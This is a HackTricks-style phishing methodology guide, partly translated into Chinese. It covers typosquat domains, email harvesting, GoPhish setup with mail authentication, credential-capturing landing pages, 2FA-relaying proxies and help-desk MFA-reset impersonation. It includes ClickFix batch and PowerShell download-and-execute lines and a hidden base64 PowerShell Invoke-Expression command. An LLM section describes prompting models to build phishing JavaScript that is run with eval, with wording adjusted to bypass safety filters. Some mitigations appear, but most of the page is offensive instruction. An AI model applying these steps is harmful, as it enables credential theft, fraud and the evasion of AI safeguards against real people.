# Phishing Methodology

{{#include ../../banners/hacktricks-training.md}}

## Methodology

1. Recon the victim
1. Select the **victim domain**.
2. Perform some basic web enumeration **searching for login portals** used by the victim and **decide** which one you will **impersonate**.
3. Use some **OSINT** to **find emails**.
2. Prepare the environment
1. **Buy the domain** you are going to use for the phishing assessment
2. **Configure the email service** related records (SPF, DMARC, DKIM, rDNS)
3. Configure the VPS with **gophish**
3. Prepare the campaign
1. Prepare the **email template**
2. Prepare the **web page** to steal the credentials
4. Launch the campaign!

## Generate similar domain names or buy a trusted domain

### Domain Name Variation Techniques

- **Keyword**: The domain name **contains** an important **keyword** of the original domain (e.g., zelster.com-management.com).
- **hypened subdomain**: Change the **dot for a hyphen** of a subdomain (e.g., www-zelster.com).
- **New TLD**: Same domain using a **new TLD** (e.g., zelster.org)
- **Homoglyph**: It **replaces** a letter in the domain name with **letters that look similar** (e.g., zelfser.com).


{{#ref}}
homograph-attacks.md
{{#endref}}
- **Transposition:** It **swaps two letters** within the domain name (e.g., zelsetr.com).
- **Singularization/Pluralization**: Adds or removes “s” at the end of the domain name (e.g., zeltsers.com).
- **Omission**: It **removes one** of the letters from the domain name (e.g., zelser.com).
- **Repetition:** It **repeats one** of the letters in the domain name (e.g., zeltsser.com).
- **Replacement**: Like homoglyph but less stealthy. It replaces one of the letters in the domain name, perhaps with a letter in proximity of the original letter on the keyboard (e.g, zektser.com).
- **Subdomained**: Introduce a **dot** inside the domain name (e.g., ze.lster.com).
- **Insertion**: It **inserts a letter** into the domain name (e.g., zerltser.com).
- **Missing dot**: Append the TLD to the domain name. (e.g., zelstercom.com)

**Automatic Tools**

- [**dnstwist**](https://github.com/elceef/dnstwist)
- [**urlcrazy**](https://github.com/urbanadventurer/urlcrazy)

**Websites**

- [https://dnstwist.it/](https://dnstwist.it)
- [https://dnstwister.report/](https://dnstwister.report)
- [https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/](https://www.internetmarketingninjas.com/tools/free-tools/domain-typo-generator/)

### Bitflipping

There is a **possibility that one of some bits stored or in communication might get automatically flipped** due to various factors like solar flares, cosmic rays, or hardware errors.

When this concept is **applied to DNS requests**, it is possible that the **domain received by the DNS server** is not the same as the domain initially requested.

For example, a single bit modification in the domain "windows.com" can change it to "windnws.com."

Attackers may **take advantage of this by registering multiple bit-flipping domains** that are similar to the victim's domain. Their intention is to redirect legitimate users to their own infrastructure.

For more information read [https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)

### Buy a trusted domain

You can search in [https://www.expireddomains.net/](https://www.expireddomains.net) for a expired domain that you could use.\
In order to make sure that the expired domain that you are going to buy **has already a good SEO** you could search how is it categorized in:

- [http://www.fortiguard.com/webfilter](http://www.fortiguard.com/webfilter)
- [https://urlfiltering.paloaltonetworks.com/query/](https://urlfiltering.paloaltonetworks.com/query/)

## Discovering Emails

- [https://github.com/laramies/theHarvester](https://github.com/laramies/theHarvester) (100% free)
- [https://phonebook.cz/](https://phonebook.cz) (100% free)
- [https://maildb.io/](https://maildb.io)
- [https://hunter.io/](https://hunter.io)
- [https://anymailfinder.com/](https://anymailfinder.com)

In order to **discover more** valid email addresses or **verify the ones** you have already discovered you can check if you can brute-force them smtp servers of the victim. [Learn how to verify/discover email address here](../../network-services-pentesting/pentesting-smtp/index.html#username-bruteforce-enumeration).\
Moreover, don't forget that if the users use **any web portal to access their mails**, you can check if it's vulnerable to **username brute force**, and exploit the vulnerability if possible.

## Configuring GoPhish

### Installation

You can download it from [https://github.com/gophish/gophish/releases/tag/v0.11.0](https://github.com/gophish/gophish/releases/tag/v0.11.0)

Download and decompress it inside `/opt/gophish` and execute `/opt/gophish/gophish`\
You will be given a password for the admin user in port 3333 in the output. Therefore, access that port and use those credentials to change the admin password. You may need to tunnel that port to local:
```bash
ssh -L 3333:127.0.0.1:3333 <user>@<ip>
```
### 配置

**TLS certificate configuration**

在这一步之前，你应该已经**购买了**你要使用的**domain**，并且它必须**指向**你正在配置 **gophish** 的 **VPS 的 IP**。
```bash
DOMAIN="<domain>"
wget https://dl.eff.org/certbot-auto
chmod +x certbot-auto
sudo apt install snapd
sudo snap install core
sudo snap refresh core
sudo apt-get remove certbot
sudo snap install --classic certbot
sudo ln -s /snap/bin/certbot /usr/bin/certbot
certbot certonly --standalone -d "$DOMAIN"
mkdir /opt/gophish/ssl_keys
cp "/etc/letsencrypt/live/$DOMAIN/privkey.pem" /opt/gophish/ssl_keys/key.pem
cp "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" /opt/gophish/ssl_keys/key.crt​
```
**Mail configuration**

Start installing: `apt-get install postfix`

Then add the domain to the following files:

- **/etc/postfix/virtual_domains**
- **/etc/postfix/transport**
- **/etc/postfix/virtual_regexp**

**Change also the values of the following variables inside /etc/postfix/main.cf**

`myhostname = <domain>`\
`mydestination = $myhostname, <domain>, localhost.com, localhost`

Finally modify the files **`/etc/hostname`** and **`/etc/mailname`** to your domain name and **restart your VPS.**

Now, create a **DNS A record** of `mail.<domain>` pointing to the **ip address** of the VPS and a **DNS MX** record pointing to `mail.<domain>`

Now lets test to send an email:
```bash
apt install mailutils
echo "This is the body of the email" | mail -s "This is the subject line" test@email.com
```
**Gophish 配置**

停止 gophish 的执行并进行配置。\
将 `/opt/gophish/config.json` 修改为如下内容（注意使用 https）：
```bash
{
"admin_server": {
"listen_url": "127.0.0.1:3333",
"use_tls": true,
"cert_path": "gophish_admin.crt",
"key_path": "gophish_admin.key"
},
"phish_server": {
"listen_url": "0.0.0.0:443",
"use_tls": true,
"cert_path": "/opt/gophish/ssl_keys/key.crt",
"key_path": "/opt/gophish/ssl_keys/key.pem"
},
"db_name": "sqlite3",
"db_path": "gophish.db",
"migrations_prefix": "db/db_",
"contact_address": "",
"logging": {
"filename": "",
"level": ""
}
}
```
**配置 gophish service**

为了创建 gophish service，以便它可以自动启动并作为一个 service 管理，你可以创建文件 `/etc/init.d/gophish`，内容如下：
```bash
#!/bin/bash
# /etc/init.d/gophish
# initialization file for stop/start of gophish application server
#
# chkconfig: - 64 36
# description: stops/starts gophish application server
# processname:gophish
# config:/opt/gophish/config.json
# From https://github.com/gophish/gophish/issues/586

# define script variables

processName=Gophish
process=gophish
appDirectory=/opt/gophish
logfile=/var/log/gophish/gophish.log
errfile=/var/log/gophish/gophish.error

start() {
echo 'Starting '${processName}'...'
cd ${appDirectory}
nohup ./$process >>$logfile 2>>$errfile &
sleep 1
}

stop() {
echo 'Stopping '${processName}'...'
pid=$(/bin/pidof ${process})
kill ${pid}
sleep 1
}

status() {
pid=$(/bin/pidof ${process})
if [["$pid" != ""| "$pid" != "" ]]; then
echo ${processName}' is running...'
else
echo ${processName}' is not running...'
fi
}

case $1 in
start|stop|status) "$1" ;;
esac
```
完成服务配置并通过以下方式检查它：
```bash
mkdir /var/log/gophish
chmod +x /etc/init.d/gophish
update-rc.d gophish defaults
#Check the service
service gophish start
service gophish status
ss -l | grep "3333\|443"
service gophish stop
```
## 配置 mail server 和 domain

### Wait & be legit

domain 越旧，被判定为 spam 的概率就越低。然后你应该在 phishing assessment 之前尽可能等待更长时间（至少 1week）。此外，如果你放一个关于 reputational sector 的页面，获得的 reputation 会更好。

注意，即使你必须等待一周，你现在也可以完成所有配置。

### Configure Reverse DNS (rDNS) record

设置一个 rDNS (PTR) record，使 VPS 的 IP address 解析到 domain name。

### Sender Policy Framework (SPF) Record

你必须为新 domain **configure a SPF record**。如果你不知道 SPF record 是什么，[**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#spf)。

你可以使用 [https://www.spfwizard.net/](https://www.spfwizard.net) 来生成你的 SPF policy（使用 VPS machine 的 IP）

![SPF Wizard form for generating an SPF record for a phishing domain](<../../images/image (1037).png>)

这是必须设置在 domain 内 TXT record 里的内容：
```bash
v=spf1 mx a ip4:ip.ip.ip.ip ?all
```
### 基于域的消息认证、报告与一致性 (DMARC) 记录

你必须 **为新域配置 DMARC 记录**。如果你不知道什么是 DMARC 记录，[**请阅读此页面**](../../network-services-pentesting/pentesting-smtp/index.html#dmarc)。

你需要创建一个新的 DNS TXT 记录，将主机名 `_dmarc.<domain>` 指向以下内容：
```bash
v=DMARC1; p=none
```
### DomainKeys Identified Mail (DKIM)

You must **configure a DKIM for the new domain**. If you don't know what is a DMARC record [**read this page**](../../network-services-pentesting/pentesting-smtp/index.html#dkim).

This tutorial is based on: [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)

> [!TIP]
> You need to concatenate both B64 values that the DKIM key generates:
>
> ```
> v=DKIM1; h=sha256; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0wPibdqPtzYk81njjQCrChIcHzxOp8a1wjbsoNtka2X9QXCZs+iXkvw++QsWDtdYu3q0Ofnr0Yd/TmG/Y2bBGoEgeE+YTUG2aEgw8Xx42NLJq2D1pB2lRQPW4IxefROnXu5HfKSm7dyzML1gZ1U0pR5X4IZCH0wOPhIq326QjxJZm79E1nTh3xj" "Y9N/Dt3+fVnIbMupzXE216TdFuifKM6Tl6O/axNsbswMS1TH812euno8xRpsdXJzFlB9q3VbMkVWig4P538mHolGzudEBg563vv66U8D7uuzGYxYT4WS8NVm3QBMg0QKPWZaKp+bADLkOSB9J2nUpk4Aj9KB5swIDAQAB
> ```

### 测试你的 email 配置评分

You can do that using [https://www.mail-tester.com/](https://www.mail-tester.com)\
Just access the page and send an email to the address they give you:
```bash
echo "This is the body of the email" | mail -s "This is the subject line" test-iimosa79z@srv1.mail-tester.com
```
你也可以通过向 `check-auth@verifier.port25.com` 发送邮件并**读取回复**来**检查你的 email 配置**（为此你需要**开放**端口 **25**，如果你以 root 身份发送邮件，则在文件 _/var/mail/root_ 中查看回复）。\
检查你是否通过了所有测试：
```bash
==========================================================
Summary of Results
==========================================================
SPF check:          pass
DomainKeys check:   neutral
DKIM check:         pass
Sender-ID check:    pass
SpamAssassin check: ham
```
你还可以向**你自己控制的 Gmail**发送**message**，然后在你的 Gmail 收件箱中检查**email’s headers**，在 `Authentication-Results` 头字段中应该会有 `dkim=pass`。
```
Authentication-Results: mx.google.com;
spf=pass (google.com: domain of contact@example.com designates --- as permitted sender) smtp.mail=contact@example.com;
dkim=pass header.i=@example.com;
```
### ​Removing from Spamhouse Blacklist

The page [www.mail-tester.com](https://www.mail-tester.com) can indicate you if you your domain is being blocked by spamhouse. You can request your domain/IP to be removed at: ​[https://www.spamhaus.org/lookup/](https://www.spamhaus.org/lookup/)

### Removing from Microsoft Blacklist

​​You can request your domain/IP to be removed at [https://sender.office.com/](https://sender.office.com).

## Create & Launch GoPhish Campaign

### Sending Profile

- Set some **name to identify** the sender profile
- Decide from which account are you going to send the phishing emails. Suggestions: _noreply, support, servicedesk, salesforce..._
- You can leave blank the username and password, but make sure to check the Ignore Certificate Errors

![Create & Launch GoPhish Campaign - Sending Profile: You can leave blank the username and password, but make sure to check the Ignore Certificate Errors](<../../images/image (253) (1) (2) (1) (1) (2) (2) (3) (3) (5) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (15) (2).png>)

> [!TIP]
> It's recommended to use the "**Send Test Email**" functionality to test that everything is working.\
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

### Email Template

- Set some **name to identify** the template
- Then write a **subject** (nothing estrange, just something you could expect to read in a regular email)
- Make sure you have checked "**Add Tracking Image**"
- Write the **email template** (you can use variables like in the following example):
```html
<html>
<head>
<title></title>
</head>
<body>
<p class="MsoNormal"><span style="font-size:10.0pt;font-family:&quot;Verdana&quot;,sans-serif;color:black">Dear {{.FirstName}} {{.LastName}},</span></p>
<br />
Note: We require all user to login an a very suspicios page before the end of the week, thanks!<br />
<br />
Regards,</span></p>

WRITE HERE SOME SIGNATURE OF SOMEONE FROM THE COMPANY

<p>{{.Tracker}}</p>
</body>
</html>
```
Note that **in order to increase the credibility of the email**, it's recommended to use some signature from an email from the client. Suggestions:

- Send an email to a **non existent address** and check if the response has any signature.
- Search for **public emails** like info@ex.com or press@ex.com or public@ex.com and send them an email and wait for the response.
- Try to contact **some valid discovered** email and wait for the response

![Sending Profile - Email Template: Try to contact some valid discovered email and wait for the response](<../../images/image (80).png>)

> [!TIP]
> The Email Template also allows to **attach files to send**. If you would also like to steal NTLM challenges using some specially crafted files/documents [read this page](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md).

### Landing Page

- Write a **name**
- **Write the HTML code** of the web page. Note that you can **import** web pages.
- Mark **Capture Submitted Data** and **Capture Passwords**
- Set a **redirection**

![Email Template - Landing Page: Mark Capture Submitted Data and Capture Passwords](<../../images/image (826).png>)

> [!TIP]
> Usually you will need to modify the HTML code of the page and make some tests in local (maybe using some Apache server) **until you like the results.** Then, write that HTML code in the box.\
> Note that if you need to **use some static resources** for the HTML (maybe some CSS and JS pages) you can save them in _**/opt/gophish/static/endpoint**_ and then access them from _**/static/\<filename>**_

> [!TIP]
> For the redirection you could **redirect the users to the legit main web page** of the victim, or redirect them to _/static/migration.html_ for example, put some **spinning wheel (**[**https://loading.io/**](https://loading.io)**) for 5 seconds and then indicate that the process was successful**.

### Users & Groups

- Set a name
- **Import the data** (note that in order to use the template for the example you need the firstname, last name and email address of each user)

![Landing Page - Users & Groups: Import the data (note that in order to use the template for the example you need the firstname, last name and email address of each user)](<../../images/image (163).png>)

### Campaign

Finally, create a campaign selecting a name, the email template, the landing page, the URL, the sending profile and the group. Note that the URL will be the link sent to the victims

Note that the **Sending Profile allow to send a test email to see how will the final phishing email looks like**:

![Users & Groups - Campaign: Note that the Sending Profile allow to send a test email to see how will the final phishing email looks like](<../../images/image (192).png>)

> [!TIP]
> I would recommend to **send the test emails to 10min mails addresses** in order to avoid getting blacklisted making tests.

Once everything is ready, just launch the campaign!

## Website Cloning

If for any reason you want to clone the website check the following page:


{{#ref}}
clone-a-website.md
{{#endref}}

## Backdoored Documents & Files

In some phishing assessments (mainly for Red Teams) you will want to also **send files containing some kind of backdoor** (maybe a C2 or maybe just something that will trigger an authentication).\
Check out the following page for some examples:


{{#ref}}
phishing-documents.md
{{#endref}}

## Phishing MFA

### Via Proxy MitM

The previous attack is pretty clever as you are faking a real website and gathering the information set by the user. Unfortunately, if the user didn't put the correct password or if the application you faked is configured with 2FA, **this information won't allow you to impersonate the tricked user**.

This is where tools like [**evilginx2**](https://github.com/kgretzky/evilginx2)**,** [**CredSniper**](https://github.com/ustayready/CredSniper) and [**muraena**](https://github.com/muraenateam/muraena) are useful. This tool will allow you to generate a MitM like attack. Basically, the attacks works in the following way:

1. You **impersonate the login** form of the real webpage.
2. The user **send** his **credentials** to your fake page and the tool send those to the real webpage, **checking if the credentials work**.
3. If the account is configured with **2FA**, the MitM page will ask for it and once the **user introduces** it the tool will send it to the real web page.
4. Once the user is authenticated you (as attacker) will have **captured the credentials, the 2FA, the cookie and any information** of every interaction your while the tool is performing a MitM.

### Via VNC

What if instead of **sending the victim to a malicious page** with the same looks as the original one, you send him to a **VNC session with a browser connected to the real web page**? You will be able to see what he does, steal the password, the MFA used, the cookies...\
You can do this with [**EvilnVNC**](https://github.com/JoelGMSec/EvilnoVNC)

## Detecting the detection

Obviously one of the best ways to know if you have been busted is to **search your domain inside blacklists**. If it appears listed, somehow your domain was detected as suspicions.\
One easy way to check if you domain appears in any blacklist is to use [https://malwareworld.com/](https://malwareworld.com)

However, there are other ways to know if the victim is **actively looking for suspicions phishing activity in the wild** as explained in:


{{#ref}}
detecting-phising.md
{{#endref}}

You can **buy a domain with a very similar name** to the victims domain **and/or generate a certificate** for a **subdomain** of a domain controlled by you **containing** the **keyword** of the victim's domain. If the **victim** perform any kind of **DNS or HTTP interaction** with them, you will know that **he is actively looking** for suspicious domains and you will need to be very stealth.

### Evaluate the phishing

Use [**Phishious** ](https://github.com/Rices/Phishious)to evaluate if your email is going to end in the spam folder or if it's going to be blocked or successful.

## High-Touch Identity Compromise (Help-Desk MFA Reset)

Modern intrusion sets increasingly skip email lures entirely and **directly target the service-desk / identity-recovery workflow** to defeat MFA.  The attack is fully "living-off-the-land": once the operator owns valid credentials they pivot with built-in admin tooling – no malware is required.

### Attack flow
1. Recon the victim
* Harvest personal & corporate details from LinkedIn, data breaches, public GitHub, etc.
* Identify high-value identities (executives, IT, finance) and enumerate the **exact help-desk process** for password / MFA reset.
2. Real-time social engineering
* Phone, Teams or chat the help-desk while impersonating the target (often with **spoofed caller-ID** or **cloned voice**).
* Provide the previously-collected PII to pass knowledge-based verification.
* Convince the agent to **reset the MFA secret** or perform a **SIM-swap** on a registered mobile number.
3. Immediate post-access actions (≤60 min in real cases)
* Establish a foothold through any web SSO portal.
* Enumerate AD / AzureAD with built-ins (no binaries dropped):
```powershell
# list directory groups & privileged roles
Get-ADGroup -Filter * -Properties Members | ?{$_.Members -match $env:USERNAME}

# AzureAD / Graph – list directory roles
Get-MgDirectoryRole | ft DisplayName,Id

# Enumerate devices the account can login to
Get-MgUserRegisteredDevice -UserId <user@corp.local>
```
* Lateral movement with **WMI**, **PsExec**, or legitimate **RMM** agents already whitelisted in the environment.

### Detection & Mitigation
* Treat help-desk identity recovery as a **privileged operation** – require step-up auth & manager approval.
* Deploy **Identity Threat Detection & Response (ITDR)** / **UEBA** rules that alert on:
* MFA method changed + authentication from new device / geo.
* Immediate elevation of the same principal (user-→-admin).
* Record help-desk calls and enforce a **call-back to an already-registered number** before any reset.
* Implement **Just-In-Time (JIT) / Privileged Access** so newly reset accounts do **not** automatically inherit high-privilege tokens.

---

## At-Scale Deception – SEO Poisoning & “ClickFix” Campaigns
Commodity crews offset the cost of high-touch ops with mass attacks that turn **search engines & ad networks into the delivery channel**.

1. **SEO poisoning / malvertising** pushes a fake result such as `chromium-update[.]site` to the top search ads.
2. Victim downloads a small **first-stage loader** (often JS/HTA/ISO).  Examples seen by Unit 42:
* `RedLine stealer`
* `Lumma stealer`
* `Lampion Trojan`
3. Loader exfiltrates browser cookies + credential DBs, then pulls a **silent loader** which decides – *in realtime* – whether to deploy:
* RAT (e.g. AsyncRAT, RustDesk)
* ransomware / wiper
* persistence component (registry Run key + scheduled task)

### Hardening tips
* Block newly-registered domains & enforce **Advanced DNS / URL Filtering** on *search-ads* as well as e-mail.
* Restrict software installation to signed MSI / Store packages, deny `HTA`, `ISO`, `VBS` execution by policy.
* Monitor for child processes of browsers opening installers:
```yaml
- parent_image: /Program Files/Google/Chrome/*
and child_image: *\\*.exe
```
* Hunt for LOLBins frequently abused by first-stage loaders (e.g. `regsvr32`, `curl`, `mshta`).

### ClickFix DLL delivery tradecraft (fake CERT update)
* Lure: cloned national CERT advisory with an **Update** button that displays step-by-step “fix” instructions. Victims are told to run a batch that downloads a DLL and executes it via `rundll32`.
* Typical batch chain observed:
```cmd
echo powershell -Command "Invoke-WebRequest -Uri 'https://example[.]org/notepad2.dll' -OutFile '%TEMP%\notepad2.dll'"
echo timeout /t 10
echo rundll32.exe "%TEMP%\notepad2.dll",notepad
```
* `Invoke-WebRequest` drops the payload to `%TEMP%`, a short sleep hides network jitter, then `rundll32` calls the exported entrypoint (`notepad`).
* The DLL beacons host identity and polls C2 every few minutes. Remote tasking arrives as **base64-encoded PowerShell** executed hidden and with policy bypass:
```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('<b64_task>')) | Invoke-Expression"
```
* This preserves C2 flexibility (server can swap tasks without updating the DLL) and hides console windows. Hunt for PowerShell children of `rundll32.exe` using `-WindowStyle Hidden` + `FromBase64String` + `Invoke-Expression` together.
* Defenders can look for HTTP(S) callbacks of the form `...page.php?tynor=<COMPUTER>sss<USER>` and 5-minute polling intervals after DLL load.

---

## AI-Enhanced Phishing Operations
Attackers now chain **LLM & voice-clone APIs** for fully personalised lures and real-time interaction.

| Layer | Example use by threat actor |
|-------|-----------------------------|
|Automation|Generate & send >100 k emails / SMS with randomised wording & tracking links.|
|Generative AI|Produce *one-off* emails referencing public M&A, inside jokes from social media; deep-fake CEO voice in callback scam.|
|Agentic AI|Autonomously register domains, scrape open-source intel, craft next-stage mails when a victim clicks but doesn’t submit creds.|

**Defence:**
• Add **dynamic banners** highlighting messages sent from untrusted automation (via ARC/DKIM anomalies).
• Deploy **voice-biometric challenge phrases** for high-risk phone requests.
• Continuously simulate AI-generated lures in awareness programmes – static templates are obsolete.

See also – agentic browsing abuse for credential phishing:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

See also – AI agent abuse of local CLI tools and MCP (for secrets inventory and detection):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## LLM-assisted runtime assembly of phishing JavaScript (in-browser codegen)

Attackers can ship benign-looking HTML and **generate the stealer at runtime** by asking a **trusted LLM API** for JavaScript, then executing it in-browser (e.g., `eval` or dynamic `<script>`).

1. **Prompt-as-obfuscation:** encode exfil URLs/Base64 strings in the prompt; iterate wording to bypass safety filters and reduce hallucinations.
2. **Client-side API call:** on load, JS calls a public LLM (Gemini/DeepSeek/etc.) or a CDN proxy; only the prompt/API call is present in static HTML.
3. **Assemble & exec:** concatenate the response and execute it (polymorphic per visit):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** generated code personalises the lure (e.g., LogoKit token parsing) and posts creds to the prompt-hidden endpoint.

**Evasion traits**
- Traffic hits well-known LLM domains or reputable CDN proxies; sometimes via WebSockets to a backend.
- No static payload; malicious JS exists only after render.
- Non-deterministic generations produce **unique** stealers per session.

**Detection ideas**
- Run sandboxes with JS enabled; flag **runtime `eval`/dynamic script creation sourced from LLM responses**.
- Hunt for front-end POSTs to LLM APIs immediately followed by `eval`/`Function` on returned text.
- Alert on unsanctioned LLM domains in client traffic plus subsequent credential POSTs.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Besides classic push-bombing, operators simply **force a new MFA registration** during the help-desk call, nullifying the user’s existing token.  Any subsequent login prompt appears legitimate to the victim.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
监控 AzureAD/AWS/Okta 事件，其中 **`deleteMFA` + `addMFA`** 在**几分钟内**且**来自同一 IP** 发生。



## Clipboard Hijacking / Pastejacking

攻击者可以从被入侵或 typosquatted 的网页中，悄悄把恶意命令复制到受害者的剪贴板里，然后诱骗用户将其粘贴到 **Win + R**、**Win + X** 或终端窗口中，从而在无需下载或附件的情况下执行任意代码。


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Malicious App Distribution (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* 一个诱饵页面（例如伪造的 ministry/CERT “channel”）展示一个 WhatsApp Web/Desktop QR，并指示受害者扫码，从而静默地将攻击者添加为 **linked device**。
* 攻击者会立即获得聊天/联系人可见性，直到该会话被移除。受害者之后可能会看到“new device linked”通知；防御者可以在访问不受信任的 QR 页面后不久，排查意外的 device-link 事件。

### Mobile‑gated phishing to evade crawlers/sandboxes
运营者越来越多地在其钓鱼流程前设置一个简单的设备检查，使桌面爬虫永远到达不了最终页面。常见模式是一个小脚本，用于测试是否存在支持触控的 DOM 并将结果发送到服务器端点；非移动端客户端会收到 HTTP 500（或空白页），而移动端用户则会看到完整流程。

Minimal client snippet (typical logic):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` 逻辑（简化版）：
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Server 行为 often observed:
- 在首次加载时设置 session cookie。
- 接受 `POST /detect {"is_mobile":true|false}`。
- 当 `is_mobile=false` 时，后续 GET 返回 500（或占位页）；只有 `true` 时才返回 phishing 内容。

Hunting and detection heuristics:
- urlscan query: `filename:"detect_device.js" AND page.status:500`
- Web telemetry: 序列 `GET /static/detect_device.js` → `POST /detect` → 对 non-mobile 返回 HTTP 500；合法的 mobile victim 路径返回 200，并继续加载后续 HTML/JS。
- 阻止或审查仅依据 `ontouchstart` 或类似 device checks 来决定内容的页面。

Defence tips:
- 用 mobile-like fingerprints 并启用 JS 运行 crawlers，以暴露 gated content。
- 对新注册域名上，在 `POST /detect` 之后出现的可疑 500 响应进行告警。

## References

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
